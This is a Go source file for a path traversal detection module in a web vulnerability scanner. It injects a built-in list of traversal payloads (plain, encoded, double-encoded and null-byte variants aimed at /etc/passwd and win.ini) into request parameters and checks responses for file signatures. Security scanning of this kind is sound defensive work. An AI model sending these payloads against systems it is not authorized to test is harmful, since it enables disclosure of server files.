package modules

import (
	"context"
	"net/http"
	"net/url"
	"strings"

	"github.com/RowanDark/0xgen/internal/atlas"
)

// PathTraversalModule detects path traversal vulnerabilities.
type PathTraversalModule struct {
	*atlas.BaseModule
	payloads []string
}

// NewPathTraversalModule creates a new path traversal detection module.
func NewPathTraversalModule(logger atlas.Logger, oastClient atlas.OASTClient) *PathTraversalModule {
	base := atlas.NewBaseModule(
		"path_traversal",
		"Path Traversal Detection",
		"injection",
		atlas.SeverityMedium,
		logger,
		oastClient,
	)

	return &PathTraversalModule{
		BaseModule: base,
		payloads:   defaultPathTraversalPayloads,
	}
}

var defaultPathTraversalPayloads = []string{
	// Unix
	"../../../etc/passwd",
	"..././..././..././etc/passwd",
	"....//....//....//etc/passwd",
	"/etc/passwd",
	"../../../../../../etc/passwd",

	// Windows
	"..\\..\\..\\windows\\win.ini",
	"..\\..\\..\\..\\..\\windows\\win.ini",
	"c:\\windows\\win.ini",

	// URL encoded
	"..%2F..%2F..%2Fetc%2Fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

	// Double encoded
	"..%252F..%252F..%252Fetc%252Fpasswd",

	// Null byte injection (for older systems)
	"../../../etc/passwd%00",
	"..\\..\\..\\windows\\win.ini%00",
}

// SupportsTarget checks if this module can scan the target.
func (m *PathTraversalModule) SupportsTarget(target *atlas.ScanTarget) bool {
	return true
}

// Scan performs path traversal detection on the target.
func (m *PathTraversalModule) Scan(ctx context.Context, target *atlas.ScanTarget) ([]*atlas.Finding, error) {
	var findings []*atlas.Finding

	params := m.extractParameters(target)
	if len(params) == 0 {
		return findings, nil
	}

	for paramName := range params {
		// Check context cancellation
		select {
		case <-ctx.Done():
			return findings, ctx.Err()
		default:
		}

		// Test path traversal
		if finding := m.testPathTraversal(ctx, target, paramName); finding != nil {
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

func (m *PathTraversalModule) testPathTraversal(ctx context.Context, target *atlas.ScanTarget, param string) *atlas.Finding {
	for _, payload := range m.payloads {
		resp, err := m.sendTestRequest(ctx, target, param, payload)
		if err != nil {
			continue
		}

		body, err := m.ReadBody(resp)
		if err != nil {
			continue
		}

		// Check for file content patterns
		if m.isFileContent(body, payload) {
			return m.CreateFinding(target, "Path Traversal", atlas.ConfidenceConfirmed, atlas.Evidence{
				Parameter: param,
				Location:  m.getParamLocation(target, param),
				Request:   atlas.FormatRequest(resp.Request),
				Response:  atlas.TruncateBody(body, 1000),
				Payload:   payload,
				Proof:     m.getFileProof(body, payload),
			})
		}
	}

	return nil
}

func (m *PathTraversalModule) isFileContent(body, payload string) bool {
	bodyLower := strings.ToLower(body)

	// /etc/passwd patterns
	if strings.Contains(payload, "passwd") {
		if strings.Contains(body, "root:x:") ||
			strings.Contains(body, "daemon:") ||
			strings.Contains(body, "/bin/bash") ||
			strings.Contains(body, "/sbin/nologin") {
			return true
		}
	}

	// win.ini patterns
	if strings.Contains(payload, "win.ini") {
		if strings.Contains(bodyLower, "[extensions]") ||
			strings.Contains(bodyLower, "[fonts]") ||
			strings.Contains(bodyLower, "[mci extensions]") {
			return true
		}
	}

	return false
}

func (m *PathTraversalModule) getFileProof(body, payload string) string {
	if strings.Contains(payload, "passwd") {
		return "File content detected: /etc/passwd (Unix password file)"
	}
	if strings.Contains(payload, "win.ini") {
		return "File content detected: win.ini (Windows configuration file)"
	}
	return "Sensitive file content detected"
}

func (m *PathTraversalModule) sendTestRequest(ctx context.Context, target *atlas.ScanTarget, param, payload string) (*http.Response, error) {
	// Clone target URL
	u, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}

	// Inject payload into parameter
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	// Create request
	req, err := http.NewRequestWithContext(ctx, target.Method, u.String(), nil)
	if err != nil {
		return nil, err
	}

	// Add custom headers
	for k, v := range target.Headers {
		req.Header.Set(k, v)
	}

	return m.SendRequest(ctx, req)
}

func (m *PathTraversalModule) extractParameters(target *atlas.ScanTarget) map[string]string {
	params := make(map[string]string)

	// From target.Parameters
	for k, v := range target.Parameters {
		params[k] = v
	}

	// From URL query string
	if u, err := url.Parse(target.URL); err == nil {
		for k, v := range u.Query() {
			if len(v) > 0 {
				params[k] = v[0]
			}
		}
	}

	return params
}

func (m *PathTraversalModule) getParamLocation(target *atlas.ScanTarget, param string) atlas.ParamLocation {
	if strings.Contains(target.URL, "?"+param+"=") || strings.Contains(target.URL, "&"+param+"=") {
		return atlas.ParamLocationQuery
	}
	if target.Method == "POST" {
		return atlas.ParamLocationBody
	}
	return atlas.ParamLocationQuery
}
